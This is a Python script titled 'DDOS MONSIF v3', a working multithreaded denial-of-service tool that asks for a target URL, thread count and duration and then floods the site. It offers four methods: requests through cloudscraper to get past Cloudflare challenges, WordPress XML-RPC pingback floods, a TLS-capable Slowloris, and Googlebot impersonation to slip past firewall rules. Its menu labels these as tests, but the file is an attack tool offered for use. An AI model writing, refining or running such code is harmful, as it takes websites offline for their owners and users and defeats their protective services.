# enjoy kid
# DDOS MONSIF v3 
# Refactored and upgraded 
import time
import random
import threading
import requests
import socket
import ssl
from urllib.parse import urlparse
import sys

# Suppress InsecureRequestWarning for headless testing
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- Library Check ---
# This ensures the required 'cloudscraper' library is available for the CFB method.
def check_and_install_cloudscraper():
    try:
        import cloudscraper
        return cloudscraper
    except ImportError:
        print("[!] The 'cloudscraper' library is required for the Cloudflare Bypass method but is not installed.")
        print("[!] Please run: pip install cloudscraper")
        sys.exit(1)

cloudscraper = check_and_install_cloudscraper()


# --- Configuration ---
# Moved User-Agent loading to be more robust.
user_agents = []
try:
    # It's best practice to use a file for a large list of user agents.
    with open("user-agents.txt", "r") as f:
        user_agents = [line.strip() for line in f.read().splitlines() if line.strip()]
    if not user_agents: raise FileNotFoundError # Handle empty file
except FileNotFoundError:
    print("[!] 'user-agents.txt' not found or is empty. Using a default user agent.")
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

def get_referers(target_url):
    return [
        "https://google.com/search?q=" + target_url,
        "https://bing.com/search?q=" + target_url,
        "https://duckduckgo.com/?q=" + target_url,
        "https://www.facebook.com/",
        "https://www.youtube.com/"
    ]


# === [Method 1] Cloudflare Bypass (CFB) ===
# Uses a scraper that can solve Cloudflare's JS challenges.
def cloudflare_bypass(target_url, stop_event):
    scraper = cloudscraper.create_scraper() # Scraper instance with JS challenge solver
    while not stop_event.is_set():
        try:
            # Add random query string for cache-busting
            url = target_url + f"/?{random.randint(1000, 9999)}"
            res = scraper.get(url, timeout=15)
            print(f"[✓] CFB Request Sent | Status: {res.status_code}")
        except Exception as e:
            print(f"[X] CFB Request Failed | Error: {type(e).__name__}")
            pass # Continue trying

# === [Method 2] WordPress Bypass (XML-RPC) ===
# Targets the xmlrpc.php file on WordPress sites with a resource-intensive pingback.
def wordpress_xmlrpc(target_url, stop_event):
    # Construct the full path to the xmlrpc.php file
    xmlrpc_path = urlparse(target_url)._replace(path="/xmlrpc.php").geturl()
    # XML payload designed to make the server work (ping itself)
    payload = f"""<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
    <param><value><string>{target_url}/?p={random.randint(1, 1000)}</string></value></param>
    <param><value><string>{target_url}</string></value></param>
</params>
</methodCall>"""
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': random.choice(get_referers(target_url)),
        'Content-Type': 'application/xml' # Essential for the server to process the request
    }
    while not stop_event.is_set():
        try:
            requests.post(xmlrpc_path, data=payload, headers=headers, verify=False, timeout=15)
            print(f"[✓] XML-RPC Pingback Sent")
        except Exception as e:
            print(f"[X] XML-RPC Request Failed | Error: {type(e).__name__}")
            pass

# === [Method 3] Improved Slowloris ===
# This version correctly handles HTTPS via SSL/TLS.
def improved_slowloris(target_url, stop_event):
    parsed_url = urlparse(target_url)
    host = parsed_url.hostname
    # Determine port: 443 for https, 80 for http
    port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    
    headers = [
        f"Host: {host}",
        f"User-Agent: {random.choice(user_agents)}",
        f"Referer: {random.choice(get_referers(target_url))}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection: keep-alive",
    ]

    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)

            # If HTTPS, wrap the socket in an SSL context
            if parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send initial request line with cache-busting
            sock.send(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
            
            # Drip headers slowly to keep the connection alive
            for header in headers:
                if stop_event.is_set(): break
                sock.send(f"{header}\r\n".encode())
                time.sleep(random.uniform(5, 10))
            
            # Keep the connection open by sending garbage data
            while not stop_event.is_set():
                sock.send(f"X-Padding: {random.randint(1,9999)}\r\n".encode())
                time.sleep(15)

        except Exception:
            pass # Socket errors are expected, just reconnect
        finally:
            if sock:
                sock.close() # Ensure socket is closed before looping
        time.sleep(1)

# === [Method 4] Bot Bypass ===
# Mimics Googlebot to trick WAFs that whitelist crawlers.
def bot_bypass(target_url, stop_event):
    # Use a legitimate Googlebot user agent
    google_bot_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    headers = {'User-Agent': google_bot_user_agent, 'Referer': 'https://www.google.com/'}
    
    while not stop_event.is_set():
        try:
            # Phase 1: Probe like a real bot to appear legitimate
            requests.get(urlparse(target_url)._replace(path="/robots.txt").geturl(), headers=headers, verify=False, timeout=10)
            time.sleep(1)
            requests.get(urlparse(target_url)._replace(path="/sitemap.xml").geturl(), headers=headers, verify=False, timeout=10)
            time.sleep(1)

            # Phase 2: Flood with cache-busting GET requests
            url = target_url + f"/?q={random.randint(10000, 999999)}"
            res = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"[✓] Bot Bypass: Flood Request Sent | Status: {res.status_code}")
            
        except Exception as e:
            print(f"[X] Bot Bypass request failed: {type(e).__name__}")
            pass


# === Main Execution ===
if __name__ == "__main__":
    print(r"""
     █████╗ ██████╗  ██████╗ ███████╗     ███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗
    ██╔══██╗██╔══██╗██╔════╝ ██╔════╝     ████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝
    ███████║██████╔╝██║  ███╗█████╗       ██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗
    ██╔══██║██╔═══╝ ██║   ██║██╔══╝       ██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║
    ██║  ██║██║      ╚██████╔╝███████╗     ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████╗
    ╚═╝  ╚═╝╚═╝       ╚═════╝ ╚══════╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝
    
        ▓▓ DDOS MONSIF v3  ▓▓
    """)
    
    TARGET_URL = input("Enter target URL (e.g. https://example.com): ").strip()
    THREADS = int(input("Enter number of threads: "))
    DURATION = int(input("Enter duration in seconds: "))

    print("""
    Select an attack method for testing:
    [1] Cloudflare Bypass (CFB)   - Tests JS challenge-solving defenses.
    [2] WordPress Bypass (XML-RPC) - Tests application-level exploit defenses.
    [3] Improved Slowloris        - Tests connection exhaustion defenses.
    [4] Bot Bypass                - Tests WAF rules and bot detection logic.
    """)
    choice = input("Enter your choice [1-4]: ")

    attack_map = {
        "1": (cloudflare_bypass, "Cloudflare Bypass"),
        "2": (wordpress_xmlrpc, "WordPress Bypass"),
        "3": (improved_slowloris, "Improved Slowloris"),
        "4": (bot_bypass, "Bot Bypass")
    }

    if choice in attack_map:
        attack_function, attack_name = attack_map[choice]
        print(f"\n[+] Initializing {attack_name} on {TARGET_URL}")
        print(f"[+] Threads: {THREADS}")
        print(f"[+] Duration: {DURATION} seconds")
        print("="*40)

        stop_event = threading.Event()
        threads = []
        for _ in range(THREADS):
            # Pass the stop_event to each thread
            t = threading.Thread(target=attack_function, args=(TARGET_URL, stop_event), daemon=True)
            threads.append(t)
            t.start()
        
        try:
            time.sleep(DURATION)
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user.")
        finally:
            stop_event.set() # Signal all threads to stop
            print("="*40)
            print(f"[+] Attack finished. Cleaning up threads.")
    
    else:
        print("[!] Invalid choice. Exiting.")